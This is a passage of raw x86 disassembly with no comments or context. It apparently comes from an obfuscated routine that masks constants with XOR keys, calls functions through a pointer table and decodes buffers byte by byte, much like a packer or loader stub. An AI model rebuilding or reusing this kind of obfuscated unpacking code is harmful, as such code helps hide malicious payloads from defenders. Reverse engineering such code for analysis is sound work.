  424885:	call   DWORD PTR [eax]
  424887:	test   eax,eax
  424889:	jne    0x4248b1
  42488b:	mov    eax,DWORD PTR [ebp+0x8]
  42488e:	mov    eax,DWORD PTR [eax+0x1d8]
  424894:	mov    edi,DWORD PTR [ebp+0x8]
  424897:	add    eax,0x10
  42489a:	mov    DWORD PTR [ebp-0x24],eax
  42489d:	mov    eax,DWORD PTR [ebp+0x8]
  4248a0:	mov    edx,DWORD PTR [eax+0x1b8]
  4248a6:	call   0x426b43
  4248ab:	push   eax
  4248ac:	mov    eax,DWORD PTR [ebp-0x24]
  4248af:	call   DWORD PTR [eax]
  4248b1:	mov    eax,DWORD PTR [ebp-0x10]
  4248b4:	mov    ecx,DWORD PTR [ebp-0x28]
  4248b7:	xor    eax,ebx
  4248b9:	add    eax,esi
  4248bb:	cmp    eax,ecx
  4248bd:	je     0x424a80
  4248c3:	mov    eax,DWORD PTR [ebp-0x18]
  4248c6:	xor    eax,ebx
  4248c8:	mov    ecx,0xffcd8d14
  4248cd:	sub    ecx,eax
  4248cf:	add    ecx,DWORD PTR [ebp-0x28]
  4248d2:	mov    eax,DWORD PTR [ebp-0x1c]
  4248d5:	cmp    eax,ecx
  4248d7:	ja     0x424a80
  4248dd:	mov    DWORD PTR [ebp-0x20],0x0
  4248e4:	push   DWORD PTR [ebp+0x8]
  4248e7:	mov    edi,DWORD PTR [ebp+0x8]
  4248ea:	mov    eax,DWORD PTR [ebp+0x8]
  4248ed:	mov    edx,DWORD PTR [eax+0x1b4]
  4248f3:	call   0x426b43
  4248f8:	push   eax
  4248f9:	mov    eax,DWORD PTR [ebp+0x8]
  4248fc:	mov    eax,DWORD PTR [eax+0x1a8]
  424902:	push   DWORD PTR [eax]
  424904:	call   0x4267e4
  424909:	mov    ecx,DWORD PTR [ebp+0x8]
  42490c:	mov    ecx,DWORD PTR [ecx+0x19c]
  424912:	mov    DWORD PTR [ecx],eax
  424914:	mov    eax,DWORD PTR [ebp+0x8]
  424917:	mov    edi,DWORD PTR [eax+0x1d8]
  42491d:	mov    esi,DWORD PTR [ebp+0x8]
  424920:	xor    eax,eax
  424922:	lea    edx,[ebp-0x7c]
  424925:	call   0x426b79
  42492a:	push   eax
  42492b:	mov    eax,DWORD PTR [ebp+0x8]
  42492e:	mov    eax,DWORD PTR [eax+0x19c]
  424934:	push   DWORD PTR [eax]
  424936:	call   DWORD PTR [edi+0x8]
  424939:	mov    DWORD PTR [ebp-0x24],eax
  42493c:	mov    eax,DWORD PTR [ebp+0x8]
  42493f:	mov    edi,DWORD PTR [eax+0x1d8]
  424945:	mov    esi,DWORD PTR [ebp+0x8]
  424948:	xor    eax,eax
  42494a:	lea    edx,[ebp-0x90]
  424950:	call   0x426b79
  424955:	push   eax
  424956:	mov    eax,DWORD PTR [ebp+0x8]
  424959:	mov    eax,DWORD PTR [eax+0x19c]
  42495f:	push   DWORD PTR [eax]
  424961:	call   DWORD PTR [edi+0x8]
  424964:	mov    eax,DWORD PTR [ebp+0x8]
  424967:	mov    edi,DWORD PTR [eax+0x1d8]
  42496d:	mov    esi,DWORD PTR [ebp+0x8]
  424970:	xor    eax,eax
  424972:	lea    edx,[ebp-0xa8]
  424978:	call   0x426b79
  42497d:	push   eax
  42497e:	mov    eax,DWORD PTR [ebp+0x8]
  424981:	mov    eax,DWORD PTR [eax+0x19c]
  424987:	push   DWORD PTR [eax]
  424989:	call   DWORD PTR [edi+0x8]
  42498c:	and    DWORD PTR [ebp-0x8],0x0
  424990:	mov    DWORD PTR [ebp-0x44],eax
  424993:	mov    eax,DWORD PTR [ebp-0x8]
  424996:	and    eax,0x7
  424999:	add    eax,0x31
  42499c:	push   eax
  42499d:	call   DWORD PTR [ebp-0x24]
  4249a0:	test   eax,eax
  4249a2:	je     0x4249e6
  4249a4:	mov    eax,DWORD PTR [ebp-0x8]
  4249a7:	push   0x19
  4249a9:	xor    edx,edx
  4249ab:	pop    ecx
  4249ac:	div    ecx
  4249ae:	add    dl,0x41
  4249b1:	movzx  eax,dl
  4249b4:	push   eax
  4249b5:	call   DWORD PTR [ebp-0x44]
  4249b8:	test   eax,eax
  4249ba:	jne    0x4249e6
  4249bc:	mov    eax,DWORD PTR [ebp+0x8]
  4249bf:	mov    edi,DWORD PTR [eax+0x1d8]
  4249c5:	mov    esi,DWORD PTR [ebp+0x8]
  4249c8:	xor    eax,eax
  4249ca:	lea    edx,[ebp-0x68]
  4249cd:	call   0x426b79
  4249d2:	push   eax
  4249d3:	mov    eax,DWORD PTR [ebp+0x8]
  4249d6:	mov    eax,DWORD PTR [eax+0x198]
  4249dc:	push   DWORD PTR [eax]
  4249de:	call   DWORD PTR [edi+0x8]
  4249e1:	mov    DWORD PTR [ebp-0x14],eax
  4249e4:	jmp    0x4249ea
  4249e6:	and    DWORD PTR [ebp-0x14],0x0
  4249ea:	inc    DWORD PTR [ebp-0x8]
  4249ed:	cmp    DWORD PTR [ebp-0x8],0x10
  4249f1:	jb     0x424993
  4249f3:	mov    eax,DWORD PTR [ebp-0x18]
  4249f6:	mov    esi,DWORD PTR [ebp+0x8]
  4249f9:	xor    eax,ebx
  4249fb:	mov    edi,0x3272ec
  424a00:	add    eax,edi
  424a02:	lea    edx,[ebp-0x10c]
  424a08:	call   0x426b79
  424a0d:	push   eax
  424a0e:	mov    eax,DWORD PTR [ebp-0x10]
  424a11:	mov    esi,DWORD PTR [ebp+0x8]
  424a14:	xor    eax,ebx
  424a16:	add    eax,edi
  424a18:	lea    edx,[ebp-0x12c]
  424a1e:	call   0x426b79
  424a23:	push   eax
  424a24:	call   DWORD PTR [ebp-0x14]
  424a27:	mov    ecx,DWORD PTR [ebp-0x10]
  424a2a:	xor    ecx,ebx
  424a2c:	add    ecx,edi
  424a2e:	cmp    ecx,eax
  424a30:	jne    0x424a39
  424a32:	mov    DWORD PTR [ebp-0x20],0x1
  424a39:	mov    eax,DWORD PTR [ebp-0x18]
  424a3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  424a3f:	xor    eax,ebx
  424a41:	lea    eax,[eax+ecx*1+0x3272ec]
  424a48:	mov    DWORD PTR [ebp-0x1c],eax
  424a4b:	mov    eax,DWORD PTR [ebp-0x20]
  424a4e:	test   eax,eax
  424a50:	je     0x424a64
  424a52:	mov    eax,DWORD PTR [ebp-0x18]
  424a55:	mov    ecx,DWORD PTR [ebp-0x34]
  424a58:	xor    eax,ebx
  424a5a:	lea    eax,[eax+ecx*1+0x3272ec]
  424a61:	mov    DWORD PTR [ebp-0x34],eax
  424a64:	mov    eax,DWORD PTR [ebp-0x18]
  424a67:	xor    eax,ebx
  424a69:	mov    ecx,0xffcd8d14
  424a6e:	sub    ecx,eax
  424a70:	add    ecx,DWORD PTR [ebp-0x28]
  424a73:	mov    eax,DWORD PTR [ebp-0x1c]
  424a76:	cmp    eax,ecx
  424a78:	jbe    0x4248dd
  424a7e:	mov    esi,edi
  424a80:	mov    eax,DWORD PTR [ebp-0x34]
  424a83:	mov    ecx,DWORD PTR [ebp-0x1c]
  424a86:	cmp    ecx,eax
  424a88:	jne    0x424a9b
  424a8a:	push   DWORD PTR [ebp+0x8]
  424a8d:	lea    eax,[ebp-0x3c]
  424a90:	push   eax
  424a91:	call   0x4275e9
  424a96:	mov    DWORD PTR [ebp-0x2c],eax
  424a99:	jmp    0x424aa7
  424a9b:	mov    eax,DWORD PTR [ebp-0x2c]
  424a9e:	mov    ecx,DWORD PTR [ebp-0x18]
  424aa1:	xor    ecx,ebx
  424aa3:	add    ecx,esi
  424aa5:	xor    DWORD PTR [eax],ecx
  424aa7:	mov    eax,DWORD PTR [ebp-0x10]
  424aaa:	mov    ecx,DWORD PTR [ebp-0x2c]
  424aad:	xor    eax,ebx
  424aaf:	add    eax,esi
  424ab1:	cmp    eax,ecx
  424ab3:	je     0x42522d
  424ab9:	mov    eax,DWORD PTR [ebp-0x10]
  424abc:	mov    ecx,DWORD PTR [ebp-0x3c]
  424abf:	xor    eax,ebx
  424ac1:	add    eax,esi
  424ac3:	cmp    eax,ecx
  424ac5:	je     0x42522d
  424acb:	mov    eax,DWORD PTR [ebp-0x10]
  424ace:	xor    eax,ebx
  424ad0:	add    eax,esi
  424ad2:	jmp    0x424af0
  424ad4:	mov    edi,DWORD PTR [ebp-0x2c]
  424ad7:	mov    cl,al
  424ad9:	and    cl,0x1f
  424adc:	or     dl,0xff
  424adf:	sub    dl,cl
  424ae1:	add    BYTE PTR [edi+eax*1],dl
  424ae4:	mov    ecx,DWORD PTR [ebp-0x18]
  424ae7:	xor    ecx,ebx
  424ae9:	lea    eax,[eax+ecx*1+0x3272ec]
  424af0:	mov    ecx,DWORD PTR [ebp-0x3c]
  424af3:	cmp    eax,ecx
  424af5:	jb     0x424ad4
  424af7:	mov    eax,DWORD PTR [ebp-0x3c]
  424afa:	mov    DWORD PTR [ebp-0x28],eax
  424afd:	mov    eax,DWORD PTR [ebp-0x2c]
  424b00:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  424b07:	mov    DWORD PTR [ebp-0xd4],eax
  424b0d:	mov    edi,0xf89c85b1
  424b12:	mov    DWORD PTR [ebp-0x30],edi
  424b15:	mov    eax,DWORD PTR [ebp-0x34]
  424b18:	xor    eax,ebx
  424b1a:	add    eax,esi
  424b1c:	mov    DWORD PTR [ebp-0xc],eax
  424b1f:	mov    eax,DWORD PTR [ebp-0x34]
  424b22:	xor    eax,ebx
  424b24:	add    eax,esi
  424b26:	mov    DWORD PTR [ebp-0x8],eax
  424b29:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424b30:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  424b37:	mov    eax,DWORD PTR [ebp-0x34]
  424b3a:	mov    ecx,DWORD PTR [ebp-0x28]
  424b3d:	xor    eax,ebx
  424b3f:	add    eax,esi
  424b41:	cmp    ecx,eax
  424b43:	je     0x424d42
  424b49:	jmp    0x424d1e
  424b4e:	mov    ecx,DWORD PTR [ebp-0xc]
  424b51:	mov    eax,DWORD PTR [ebp-0x28]
  424b54:	sub    eax,ecx
  424b56:	mov    ecx,DWORD PTR [ebp-0x44]
  424b59:	xor    ecx,ebx
  424b5b:	add    ecx,esi
  424b5d:	xor    edx,edx
  424b5f:	div    ecx
  424b61:	mov    DWORD PTR [ebp-0x8],eax
  424b64:	mov    eax,DWORD PTR [ebp-0x4c]
  424b67:	mov    ecx,DWORD PTR [ebp-0x8]
  424b6a:	xor    eax,ebx
  424b6c:	add    eax,esi
  424b6e:	cmp    ecx,eax
  424b70:	jbe    0x424b7c
  424b72:	mov    eax,DWORD PTR [ebp-0x4c]
  424b75:	xor    eax,ebx
  424b77:	add    eax,esi
  424b79:	mov    DWORD PTR [ebp-0x8],eax
  424b7c:	mov    eax,DWORD PTR [ebp-0x44]
  424b7f:	mov    ecx,DWORD PTR [ebp-0x8]
  424b82:	xor    eax,ebx
  424b84:	add    eax,esi
  424b86:	imul   eax,ecx
  424b89:	mov    DWORD PTR [ebp-0x8],eax
  424b8c:	mov    eax,DWORD PTR [ebp-0x34]
  424b8f:	mov    ecx,DWORD PTR [ebp-0x8]
  424b92:	xor    eax,ebx
  424b94:	add    eax,esi
  424b96:	cmp    ecx,eax
  424b98:	je     0x424d0c
  424b9e:	mov    eax,DWORD PTR [ebp-0x8]
  424ba1:	mov    DWORD PTR [ebp-0x14],eax
  424ba4:	mov    eax,DWORD PTR [ebp-0xc]
  424ba7:	add    eax,DWORD PTR [ebp-0xd4]
  424bad:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  424bb4:	mov    DWORD PTR [ebp-0x20],edi
  424bb7:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  424bc1:	mov    DWORD PTR [ebp-0x8],eax
  424bc4:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  424bcb:	mov    DWORD PTR [ebp-0x1c],edi
  424bce:	mov    eax,DWORD PTR [ebp-0x24]
  424bd1:	xor    eax,ebx
  424bd3:	add    eax,esi
  424bd5:	jmp    0x424ccb
  424bda:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  424be4:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  424bee:	mov    eax,DWORD PTR [ebp-0x1c]
  424bf1:	mov    ecx,DWORD PTR [ebp-0x48]
  424bf4:	xor    eax,ebx
  424bf6:	add    eax,esi
  424bf8:	imul   eax,ecx
  424bfb:	mov    ecx,DWORD PTR [ebp-0x8]
  424bfe:	mov    al,BYTE PTR [eax+ecx*1]
  424c01:	mov    BYTE PTR [ebp-0x2],al
  424c04:	mov    eax,DWORD PTR [ebp-0x1c]
  424c07:	mov    ecx,DWORD PTR [ebp-0x48]
  424c0a:	xor    eax,ebx
  424c0c:	add    eax,esi
  424c0e:	imul   eax,ecx
  424c11:	mov    ecx,DWORD PTR [ebp-0xe8]
  424c17:	xor    ecx,ebx
  424c19:	add    eax,ecx
  424c1b:	mov    ecx,DWORD PTR [ebp-0x8]
  424c1e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424c26:	mov    ecx,DWORD PTR [ebp-0xe0]
  424c2c:	xor    ecx,ebx
  424c2e:	lea    eax,[ecx+eax*1+0x3272ec]
  424c35:	movzx  ecx,BYTE PTR [ebp-0x2]
  424c39:	xor    ecx,eax
  424c3b:	mov    BYTE PTR [ebp-0x2],cl
  424c3e:	mov    al,BYTE PTR [ebp-0x2]
  424c41:	mov    ecx,DWORD PTR [ebp-0x1c]
  424c44:	mov    edx,DWORD PTR [ebp-0x48]
  424c47:	xor    ecx,ebx
  424c49:	add    ecx,esi
  424c4b:	imul   ecx,edx
  424c4e:	mov    edx,DWORD PTR [ebp-0x8]
  424c51:	mov    BYTE PTR [ecx+edx*1],al
  424c54:	mov    eax,DWORD PTR [ebp-0x1c]
  424c57:	mov    ecx,DWORD PTR [ebp-0x48]
  424c5a:	xor    eax,ebx
  424c5c:	add    eax,esi
  424c5e:	imul   eax,ecx
  424c61:	mov    ecx,DWORD PTR [ebp-0x8]
  424c64:	mov    al,BYTE PTR [eax+ecx*1]
  424c67:	mov    BYTE PTR [ebp-0x2],al
  424c6a:	mov    eax,DWORD PTR [ebp-0x1c]
  424c6d:	mov    ecx,DWORD PTR [ebp-0x48]
  424c70:	xor    eax,ebx
  424c72:	add    eax,esi
  424c74:	imul   eax,ecx
  424c77:	mov    ecx,DWORD PTR [ebp-0x20]
  424c7a:	xor    ecx,ebx
  424c7c:	add    eax,ecx
  424c7e:	mov    ecx,DWORD PTR [ebp-0x8]
  424c81:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424c89:	mov    ecx,DWORD PTR [ebp-0xc4]
  424c8f:	xor    ecx,ebx
  424c91:	lea    eax,[ecx+eax*1+0x3272ec]
  424c98:	movzx  ecx,BYTE PTR [ebp-0x2]
  424c9c:	xor    ecx,eax
  424c9e:	mov    BYTE PTR [ebp-0x2],cl
  424ca1:	mov    al,BYTE PTR [ebp-0x2]
  424ca4:	mov    ecx,DWORD PTR [ebp-0x1c]
  424ca7:	mov    edx,DWORD PTR [ebp-0x48]
  424caa:	xor    ecx,ebx
  424cac:	add    ecx,esi
  424cae:	imul   ecx,edx
  424cb1:	mov    edx,DWORD PTR [ebp-0x8]
  424cb4:	mov    BYTE PTR [ecx+edx*1],al
  424cb7:	mov    eax,DWORD PTR [ebp-0x38]
  424cba:	mov    ecx,DWORD PTR [ebp-0x20]
  424cbd:	xor    eax,ebx
  424cbf:	xor    ecx,ebx
  424cc1:	add    eax,esi
  424cc3:	add    ecx,esi
  424cc5:	imul   eax,ecx
  424cc8:	add    eax,DWORD PTR [ebp-0x48]
  424ccb:	mov    DWORD PTR [ebp-0x48],eax
  424cce:	mov    eax,DWORD PTR [ebp-0x48]
  424cd1:	mov    ecx,DWORD PTR [ebp-0x14]
  424cd4:	cmp    ecx,eax
  424cd6:	jb     0x424bda
  424cdc:	mov    eax,DWORD PTR [ebp-0x20]
  424cdf:	mov    ecx,DWORD PTR [ebp-0x14]
  424ce2:	xor    eax,ebx
  424ce4:	add    eax,esi
  424ce6:	imul   eax,ecx
  424ce9:	mov    ecx,DWORD PTR [ebp-0x24]
  424cec:	xor    ecx,ebx
  424cee:	add    ecx,esi
  424cf0:	or     eax,ecx
  424cf2:	mov    ecx,DWORD PTR [ebp-0x30]
  424cf5:	xor    ecx,ebx
  424cf7:	add    eax,ecx
  424cf9:	mov    ecx,DWORD PTR [ebp-0x30]
  424cfc:	xor    ecx,ebx
  424cfe:	add    eax,ecx
  424d00:	mov    ecx,DWORD PTR [ebp-0xc]
  424d03:	lea    eax,[eax+ecx*1+0x64e5d8]
  424d0a:	jmp    0x424d1b
  424d0c:	mov    eax,DWORD PTR [ebp-0x30]
  424d0f:	mov    ecx,DWORD PTR [ebp-0xc]
  424d12:	xor    eax,ebx
  424d14:	lea    eax,[eax+ecx*1+0x3272ec]
  424d1b:	mov    DWORD PTR [ebp-0xc],eax
  424d1e:	mov    eax,DWORD PTR [ebp-0x30]
  424d21:	xor    eax,ebx
  424d23:	mov    ecx,0xffcd8d14
  424d28:	sub    ecx,eax
  424d2a:	add    ecx,DWORD PTR [ebp-0x28]
  424d2d:	mov    eax,DWORD PTR [ebp-0x30]
  424d30:	mov    edx,DWORD PTR [ebp-0xc]
  424d33:	xor    eax,ebx
  424d35:	add    eax,esi
  424d37:	imul   eax,edx
  424d3a:	cmp    eax,ecx
  424d3c:	jbe    0x424b4e
  424d42:	mov    eax,DWORD PTR [ebp-0x10]
  424d45:	mov    ecx,DWORD PTR [ebp-0x3c]
  424d48:	mov    eax,DWORD PTR [ebp+0x8]
  424d4b:	mov    edx,DWORD PTR [ebp-0x54]
  424d4e:	mov    eax,DWORD PTR [eax+0x1d8]
  424d54:	xor    edx,ebx
  424d56:	add    edx,esi
  424d58:	push   edx
  424d59:	mov    edx,DWORD PTR [ebp-0x40]
  424d5c:	xor    edx,ebx
  424d5e:	add    edx,esi
  424d60:	push   edx
  424d61:	push   ecx
  424d62:	mov    DWORD PTR [ebp-0x38],ecx
  424d65:	mov    ecx,DWORD PTR [ebp-0x10]
  424d68:	xor    ecx,ebx
  424d6a:	add    ecx,esi
  424d6c:	push   ecx
  424d6d:	call   DWORD PTR [eax+0x14]
  424d70:	mov    edi,eax
  424d72:	mov    eax,DWORD PTR [ebp-0x10]
  424d75:	xor    eax,ebx
  424d77:	add    eax,esi
  424d79:	cmp    eax,edi
  424d7b:	je     0x424dd6
  424d7d:	mov    eax,DWORD PTR [ebp-0x10]
  424d80:	jmp    0x424da3
  424d82:	mov    ecx,DWORD PTR [ebp-0x2c]
  424d85:	xor    eax,ebx
  424d87:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  424d8e:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  424d95:	mov    ecx,DWORD PTR [ebp-0x18]
  424d98:	xor    ecx,ebx
  424d9a:	lea    eax,[ecx+eax*1+0x3272ec]
  424da1:	xor    eax,ebx
  424da3:	mov    ecx,DWORD PTR [ebp-0x3c]
  424da6:	sub    ecx,esi
  424da8:	xor    ecx,ebx
  424daa:	cmp    eax,ecx
  424dac:	jne    0x424d82
  424dae:	mov    eax,DWORD PTR [ebp+0x8]
  424db1:	mov    ecx,DWORD PTR [ebp-0x50]
  424db4:	mov    eax,DWORD PTR [eax+0x1d8]
  424dba:	xor    ecx,ebx
  424dbc:	add    ecx,esi
  424dbe:	push   ecx
  424dbf:	mov    ecx,DWORD PTR [ebp-0x10]
  424dc2:	xor    ecx,ebx
  424dc4:	add    ecx,esi
  424dc6:	push   ecx
  424dc7:	push   DWORD PTR [ebp-0x2c]
  424dca:	call   DWORD PTR [eax+0x18]
  424dcd:	mov    eax,DWORD PTR [ebp-0x38]
  424dd0:	mov    DWORD PTR [ebp-0x2c],edi
  424dd3:	mov    DWORD PTR [ebp-0x3c],eax
  424dd6:	mov    eax,DWORD PTR [ebp-0x2c]
  424dd9:	mov    DWORD PTR [ebp-0x14],eax
  424ddc:	mov    eax,DWORD PTR [ebp-0x18]
  424ddf:	mov    ecx,DWORD PTR [ebp-0x10]
  424de2:	xor    eax,ebx
  424de4:	add    eax,esi
  424de6:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  424ded:	mov    DWORD PTR [ebp-0x58],0x37223f22
  424df4:	jmp    0x424e27
  424df6:	mov    edx,DWORD PTR [ebp-0x14]
  424df9:	mov    edi,ecx
  424dfb:	xor    edi,ebx
  424dfd:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  424e04:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  424e0c:	xor    cl,0x79
  424e0f:	sub    cl,0x3
  424e12:	movzx  ecx,cl
  424e15:	cmp    edx,ecx
  424e17:	jne    0x424e31
  424e19:	mov    ecx,DWORD PTR [ebp-0x18]
  424e1c:	xor    ecx,ebx
  424e1e:	lea    ecx,[ecx+edi*1+0x3272ec]
  424e25:	xor    ecx,ebx
  424e27:	cmp    ecx,0xf89c85b8
  424e2d:	jne    0x424df6
  424e2f:	jmp    0x424e38
  424e31:	mov    eax,DWORD PTR [ebp-0x10]
  424e34:	xor    eax,ebx
  424e36:	add    eax,esi
  424e38:	mov    ecx,DWORD PTR [ebp-0x10]
  424e3b:	xor    ecx,ebx
  424e3d:	add    ecx,esi
  424e3f:	cmp    ecx,eax
  424e41:	je     0x424fb7
  424e47:	mov    eax,DWORD PTR [ebp-0x14]
  424e4a:	mov    eax,DWORD PTR [eax+0x8]
  424e4d:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  424e54:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  424e5b:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  424e62:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  424e69:	mov    DWORD PTR [ebp-0x20],eax
  424e6c:	mov    eax,DWORD PTR [ebp+0x8]
  424e6f:	mov    ecx,DWORD PTR [ebp-0x24]
  424e72:	xor    ecx,ebx
  424e74:	add    ecx,esi
  424e76:	push   ecx
  424e77:	mov    ecx,DWORD PTR [ebp-0x44]
  424e7a:	mov    eax,DWORD PTR [eax+0x1d8]
  424e80:	xor    ecx,ebx
  424e82:	add    ecx,esi
  424e84:	push   ecx
  424e85:	mov    ecx,DWORD PTR [ebp-0x40]
  424e88:	xor    ecx,ebx
  424e8a:	add    ecx,esi
  424e8c:	push   ecx
  424e8d:	mov    ecx,DWORD PTR [ebp-0xc]
  424e90:	xor    ecx,ebx
  424e92:	add    ecx,esi
  424e94:	push   ecx
  424e95:	call   DWORD PTR [eax+0x14]
  424e98:	mov    edi,eax
  424e9a:	mov    eax,DWORD PTR [ebp+0x8]
  424e9d:	mov    ecx,DWORD PTR [ebp-0x24]
  424ea0:	mov    eax,DWORD PTR [eax+0x1d8]
  424ea6:	xor    ecx,ebx
  424ea8:	add    ecx,esi
  424eaa:	push   ecx
  424eab:	mov    ecx,DWORD PTR [ebp-0x44]
  424eae:	xor    ecx,ebx
  424eb0:	add    ecx,esi
  424eb2:	push   ecx
  424eb3:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb6:	push   DWORD PTR [ebp-0x20]
  424eb9:	xor    ecx,ebx
  424ebb:	add    ecx,esi
  424ebd:	push   ecx
  424ebe:	call   DWORD PTR [eax+0x14]
  424ec1:	mov    ecx,DWORD PTR [ebp-0xc]
  424ec4:	xor    ecx,ebx
  424ec6:	add    ecx,esi
  424ec8:	mov    DWORD PTR [ebp-0x24],eax
  424ecb:	cmp    ecx,edi
  424ecd:	je     0x42525a
  424ed3:	mov    ecx,DWORD PTR [ebp-0xc]
  424ed6:	xor    ecx,ebx
  424ed8:	add    ecx,esi
  424eda:	cmp    ecx,eax
  424edc:	je     0x42525a
  424ee2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  424ee9:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  424ef0:	mov    ecx,DWORD PTR [ebp-0x40]
  424ef3:	xor    cl,0xa4
  424ef6:	sub    cl,0x14
  424ef9:	mov    BYTE PTR [edi],cl
  424efb:	mov    ecx,DWORD PTR [ebp-0xc]
  424efe:	xor    cl,0xa4
  424f01:	sub    cl,0x14
  424f04:	mov    BYTE PTR [edi+0x1],cl
  424f07:	mov    ecx,DWORD PTR [ebp-0x54]
  424f0a:	xor    cl,0xa4
  424f0d:	sub    cl,0x14
  424f10:	mov    BYTE PTR [edi+0x2],cl
  424f13:	and    DWORD PTR [ebp-0xc8],0x0
  424f1a:	and    DWORD PTR [ebp-0xdc],0x0
  424f21:	lea    ecx,[ebp-0xdc]
  424f27:	push   ecx
  424f28:	push   DWORD PTR [ebp-0x20]
  424f2b:	push   eax
  424f2c:	lea    eax,[ebp-0xc8]
  424f32:	push   eax
  424f33:	mov    eax,DWORD PTR [ebp-0x14]
  424f36:	push   DWORD PTR [eax+0xc]
  424f39:	mov    eax,DWORD PTR [ebp-0x2c]
  424f3c:	add    eax,0x10
  424f3f:	push   eax
  424f40:	push   edi
  424f41:	call   0x4241e5
  424f46:	mov    DWORD PTR [ebp-0x40],eax
  424f49:	mov    eax,DWORD PTR [ebp+0x8]
  424f4c:	mov    ecx,DWORD PTR [ebp-0x50]
  424f4f:	mov    eax,DWORD PTR [eax+0x1d8]
  424f55:	xor    ecx,ebx
  424f57:	add    ecx,esi
  424f59:	push   ecx
  424f5a:	mov    ecx,DWORD PTR [ebp-0xc]
  424f5d:	xor    ecx,ebx
  424f5f:	add    ecx,esi
  424f61:	push   ecx
  424f62:	push   edi
  424f63:	call   DWORD PTR [eax+0x18]
  424f66:	mov    eax,DWORD PTR [ebp-0x40]
  424f69:	add    eax,0xffcd8d14
  424f6e:	xor    eax,ebx
  424f70:	cmp    eax,0xf89c85b0
  424f75:	mov    eax,DWORD PTR [ebp+0x8]
  424f78:	mov    eax,DWORD PTR [eax+0x1d8]
  424f7e:	mov    ecx,DWORD PTR [ebp-0x50]
  424f81:	jne    0x424fa4
  424f83:	xor    ecx,ebx
  424f85:	add    ecx,esi
  424f87:	push   ecx
  424f88:	mov    ecx,DWORD PTR [ebp-0xc]
  424f8b:	xor    ecx,ebx
  424f8d:	add    ecx,esi
  424f8f:	push   ecx
  424f90:	push   DWORD PTR [ebp-0x2c]
  424f93:	call   DWORD PTR [eax+0x18]
  424f96:	mov    eax,DWORD PTR [ebp-0x24]
  424f99:	mov    DWORD PTR [ebp-0x2c],eax
  424f9c:	mov    eax,DWORD PTR [ebp-0x20]
  424f9f:	mov    DWORD PTR [ebp-0x3c],eax
  424fa2:	jmp    0x424fb7
  424fa4:	xor    ecx,ebx
  424fa6:	add    ecx,esi
  424fa8:	push   ecx
  424fa9:	mov    ecx,DWORD PTR [ebp-0xc]
  424fac:	xor    ecx,ebx
  424fae:	add    ecx,esi
  424fb0:	push   ecx
  424fb1:	push   DWORD PTR [ebp-0x24]
  424fb4:	call   DWORD PTR [eax+0x18]
  424fb7:	mov    eax,DWORD PTR [ebp-0x3c]
  424fba:	mov    DWORD PTR [ebp-0x34],eax
  424fbd:	mov    eax,DWORD PTR [ebp-0x2c]
  424fc0:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  424fc7:	mov    DWORD PTR [ebp-0x40],eax
  424fca:	mov    edi,0xf89c85b1
  424fcf:	mov    DWORD PTR [ebp-0x30],edi
  424fd2:	mov    eax,DWORD PTR [ebp-0x28]
  424fd5:	xor    eax,ebx
  424fd7:	add    eax,esi
  424fd9:	mov    DWORD PTR [ebp-0xc],eax
  424fdc:	mov    eax,DWORD PTR [ebp-0x28]
  424fdf:	xor    eax,ebx
  424fe1:	add    eax,esi
  424fe3:	mov    DWORD PTR [ebp-0x14],eax
  424fe6:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424fed:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  424ff4:	mov    eax,DWORD PTR [ebp-0x28]
  424ff7:	mov    ecx,DWORD PTR [ebp-0x34]
  424ffa:	xor    eax,ebx
  424ffc:	add    eax,esi
  424ffe:	cmp    ecx,eax
  425000:	je     0x4251f6
  425006:	jmp    0x4251d2
  42500b:	mov    ecx,DWORD PTR [ebp-0xc]
  42500e:	mov    eax,DWORD PTR [ebp-0x34]
  425011:	sub    eax,ecx
  425013:	mov    ecx,DWORD PTR [ebp-0x44]
  425016:	xor    ecx,ebx
  425018:	add    ecx,esi
  42501a:	xor    edx,edx
  42501c:	div    ecx
  42501e:	mov    DWORD PTR [ebp-0x14],eax
  425021:	mov    eax,DWORD PTR [ebp-0x24]
  425024:	mov    ecx,DWORD PTR [ebp-0x14]
  425027:	xor    eax,ebx
  425029:	add    eax,esi
  42502b:	cmp    ecx,eax
  42502d:	jbe    0x425039
  42502f:	mov    eax,DWORD PTR [ebp-0x24]
  425032:	xor    eax,ebx
  425034:	add    eax,esi
  425036:	mov    DWORD PTR [ebp-0x14],eax
  425039:	mov    eax,DWORD PTR [ebp-0x44]
  42503c:	mov    ecx,DWORD PTR [ebp-0x14]
  42503f:	xor    eax,ebx
  425041:	add    eax,esi
  425043:	imul   eax,ecx
  425046:	mov    DWORD PTR [ebp-0x14],eax
  425049:	mov    eax,DWORD PTR [ebp-0x28]
  42504c:	mov    ecx,DWORD PTR [ebp-0x14]
  42504f:	xor    eax,ebx
  425051:	add    eax,esi
  425053:	cmp    ecx,eax
  425055:	je     0x4251c0
  42505b:	mov    eax,DWORD PTR [ebp-0x14]
  42505e:	mov    DWORD PTR [ebp-0x20],eax
  425061:	mov    eax,DWORD PTR [ebp-0xc]
  425064:	add    eax,DWORD PTR [ebp-0x40]
  425067:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  42506e:	mov    DWORD PTR [ebp-0x14],edi
  425071:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
